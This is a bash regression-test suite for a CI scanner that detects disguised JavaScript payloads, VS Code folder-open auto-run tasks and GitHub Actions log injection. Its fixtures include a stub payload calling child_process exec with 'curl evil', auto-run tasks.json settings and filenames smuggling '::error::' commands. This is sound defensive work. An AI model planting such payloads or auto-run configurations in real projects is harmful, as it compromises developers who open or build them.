#!/usr/bin/env bash
#
# Regression tests for scripts/scan-injection.sh.
#
# Usage:
#   tests/scan-injection.test.sh [path-to-scan-injection.sh]
#
# Runs against ANY copy of the scanner, which is the point: point it at the
# previous revision of the script (git show <sha>:scripts/scan-injection.sh > old.sh)
# to prove a bypass really existed before the fix, and at the current one to prove
# it is closed. Every case builds a throwaway git repo, because the scanner only
# looks at TRACKED files.
#
# POSITIVE cases must be detected (scanner exit 1); NEGATIVE cases must stay clean
# (exit 0). The negative cases carry equal weight: this scanner gates CI in ten
# repos, so a false positive is its own outage.
#
# NOTE: fixtures are generated at runtime, never committed. A committed fixture
# carrying a real marker would be a tracked file in this repo and would (correctly)
# fail this repo's own scan.

set -uo pipefail

SCRIPT=${1:-scripts/scan-injection.sh}
case "$SCRIPT" in /*) ;; *) SCRIPT="$PWD/$SCRIPT" ;; esac
[ -f "$SCRIPT" ] || { echo "no such scanner: $SCRIPT" >&2; exit 2; }

pass=0; fail=0

# $1 = expected exit (0 clean / 1 detected), $2 = case name, $3 = fixture builder
run_case() {
  local want=$1 name=$2 build=$3 got out tmp
  tmp=$(mktemp -d)
  (
    cd "$tmp" || exit 2
    git init -q .
    git config user.email t@t; git config user.name t
    "$build"
    git add -A >/dev/null 2>&1
  )
  out=$(cd "$tmp" && bash "$SCRIPT" 2>&1); got=$?
  if [ "$got" = "$want" ]; then
    pass=$((pass+1)); printf 'PASS  %-58s (exit %s)\n' "$name" "$got"
  else
    fail=$((fail+1)); printf 'FAIL  %-58s (want exit %s, got %s)\n' "$name" "$want" "$got"
    printf '%s\n' "$out" | sed 's/^/        | /'
  fi
  [ "$got" = "$want" ] || return 0
  # On an expected detection, show WHAT was reported, so a pass cannot be an
  # accident of some unrelated check firing.
  if [ "$want" = 1 ]; then printf '%s\n' "$out" | sed -n 's/^/        > /p'; fi
  rm -rf "$tmp"
}

# --- fixture helpers -------------------------------------------------------
js_payload() {
  # A compact stand-in for the real blob: hex identifiers + require hijack, the
  # shape checks (1)/(2) look for.
  printf 'var _0xa1b2=["log"];global.i="A8-2503#new";var _0xc3d4=require("child_process");_0xc3d4.exec("curl evil");\n'
}
real_woff2() { printf 'wOF2'; head -c 200 /dev/urandom; }
real_png()   { printf '\211PNG\r\n\032\n'; head -c 200 /dev/urandom; }

# ===========================================================================
# FINDING A — uppercase extensions
# ===========================================================================

# Total bypass: with an uppercase extension the file is not a binary asset (so
# check (4) skips it) AND is_scan_target lists no font/image extensions (so
# checks (1)-(3) never see it) — no check examines it at all.
fx_a1() { mkdir -p public/fonts; js_payload > public/fonts/fa-solid-400.WOFF2; }
run_case 1 "A/pos: payload as .WOFF2 (uppercase font ext)" fx_a1

fx_a2() { mkdir -p public/img; js_payload > public/img/logo.PNG; }
run_case 1 "A/pos: payload as .PNG (uppercase image ext)" fx_a2

fx_a3() { mkdir -p src; js_payload > src/stager.JS; }
run_case 1 "A/pos: payload as .JS (uppercase code ext)" fx_a3

# Combined with the NUL-delimited path fix: non-ASCII name (git would C-quote it
# without ls-files -z) AND an uppercase disguised font extension.
fx_a4() { mkdir -p public/fonts; js_payload > "public/fonts/café.WOFF2"; }
run_case 1 "A+NUL/pos: payload as café.WOFF2 (non-ASCII + uppercase)" fx_a4

fx_a5() { mkdir -p public/fonts; js_payload > "public/fonts/café.woff2"; }
run_case 1 "NUL/pos: payload as café.woff2 (non-ASCII path)" fx_a5

# Negative: a GENUINE uppercase-extension font/image must still pass. This is the
# case that would redden CI in every consumer if the fix over-reached.
fx_a6() { mkdir -p public/fonts public/img; real_woff2 > public/fonts/Inter.WOFF2; real_png > public/img/Logo.PNG; }
run_case 0 "A/neg: genuine Inter.WOFF2 + Logo.PNG (valid magic)" fx_a6

fx_a7() { mkdir -p public/fonts public/img; real_woff2 > public/fonts/inter.woff2; real_png > public/img/logo.png; }
run_case 0 "A/neg: genuine lowercase .woff2 + .png (unchanged)" fx_a7

# ===========================================================================
# FINDING B — structural tokens split across physical lines
# ===========================================================================

# Deliberately NOT the literal "A8-2503": MARKER_RE carries that string as a
# bare alternative, which would match the value line on its own and mask whether
# the structural (global<assign>"A8-) alternative spans the line break. A mutated
# campaign tag is matched ONLY by the structural alternative, so this case tests
# exactly the line-splitting evasion.
fx_b1() { mkdir -p src; printf 'const x = 1;\nglobal.i =\n  "A8-2604#new";\n' > src/boot.js; }
run_case 1 "B/pos: global.i = <newline> \"A8-2604\" (split marker)" fx_b1

fx_b2() { mkdir -p src; printf 'global["mod"] =\n  require("child_process");\n' > src/hijack.mjs; }
run_case 1 "B/pos: global[..] = <newline> require(..) (split hijack)" fx_b2

fx_b3() {
  mkdir -p .vscode
  printf '{\n  "version": "2.0.0",\n  "tasks": [\n    { "label": "x", "runOptions": { "runOn":\n        "folderOpen" } }\n  ]\n}\n' > .vscode/tasks.json
}
run_case 1 "B/pos: \"runOn\": <newline> \"folderOpen\" (split JSONC key)" fx_b3

fx_b4() { mkdir -p .vscode; printf '{\n  "task.allowAutomaticTasks":\n    true\n}\n' > .vscode/settings.json; }
run_case 1 "B/pos: task.allowAutomaticTasks: <newline> true" fx_b4

# Negative: ordinary multi-line source. Folding newlines to spaces must not make
# these match, because the patterns still require value adjacency.
fx_b5() {
  mkdir -p src
  printf 'global.foo = "bar";\nconst greeting =\n  "hello world";\nexport const code =\n  "A8-9999";\n' > src/ordinary.js
}
run_case 0 "B/neg: global.foo=\"bar\" + split ordinary strings" fx_b5

# The precise near-miss for over-broadening: both tokens present, on adjacent
# lines, but NOT adjacent to each other.
fx_b6() {
  mkdir -p .vscode
  printf '{\n  "version": "2.0.0",\n  "tasks": [\n    {\n      "label": "build",\n      "runOptions": { "runOn": "default" },\n      "detail": "folderOpen"\n    }\n  ]\n}\n' > .vscode/tasks.json
}
run_case 0 "B/neg: runOn:\"default\" + separate \"folderOpen\" value" fx_b6

fx_b7() {
  mkdir -p .vscode
  printf '{\n  "version": "2.0.0",\n  "tasks": [\n    { "label": "build", "type": "shell", "command": "pnpm build",\n      "presentation": { "reveal": "always" } }\n  ]\n}\n' > .vscode/tasks.json
}
run_case 0 "B/neg: ordinary tasks.json (build task, reveal always)" fx_b7

# ===========================================================================
# Baseline: the checks that already worked must keep working.
# ===========================================================================
fx_r1() { mkdir -p public/fonts; js_payload > public/fonts/fa-solid-400.woff2; }
run_case 1 "base/pos: payload as lowercase .woff2 (magic mismatch)" fx_r1

fx_r2() { mkdir -p .vscode; printf '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"hide":true}]}\n' > .vscode/tasks.json; }
run_case 1 "base/pos: single-line runOn folderOpen" fx_r2

fx_r3() { mkdir -p src; printf 'export const a = 1;\nexport function f() { return a + 1; }\n' > src/clean.ts; printf '{"name":"x","version":"1.0.0"}\n' > package.json; }
run_case 0 "base/neg: ordinary clean repo" fx_r3

# ===========================================================================
# Log injection — a pathname is attacker-controlled DATA, never a workflow command
# ===========================================================================
# Findings go to a GitHub Actions step's stderr, which Actions parses line by line
# for `::command::`. A tracked file called `::error::spoofed.js`, or one with an
# embedded newline, must not be able to forge an annotation. Checked by inspecting
# the output, not just the exit code.
tmp=$(mktemp -d)
(
  cd "$tmp" || exit 2
  git init -q .; git config user.email t@t; git config user.name t
  mkdir -p src
  js_payload > "$(printf 'src/evil\n::error::spoofed')".js
  js_payload > 'src/::error::spoofed2.js'
  git add -A >/dev/null 2>&1
)
out=$(cd "$tmp" && bash "$SCRIPT" 2>&1); got=$?
# The legitimate header is the only line allowed to begin with ::error::
forged=$(printf '%s\n' "$out" | grep -c '^::error::spoofed' || true)
raw=$(printf '%s\n' "$out" | grep -c '^::error::' || true)
if [ "$got" = 1 ] && [ "${forged:-0}" -eq 0 ] && [ "${raw:-0}" -eq 1 ]; then
  pass=$((pass+1)); printf 'PASS  %-58s (exit %s)\n' "inj: newline/::error:: in pathname is escaped" "$got"
  printf '%s\n' "$out" | sed -n 's/^/        > /p'
else
  fail=$((fail+1)); printf 'FAIL  %-58s (exit %s, forged=%s, ::error:: lines=%s)\n' "inj: newline/::error:: in pathname is escaped" "$got" "$forged" "$raw"
  printf '%s\n' "$out" | sed 's/^/        | /'
fi
rm -rf "$tmp"

echo
echo "passed: $pass   failed: $fail"
[ "$fail" -eq 0 ]
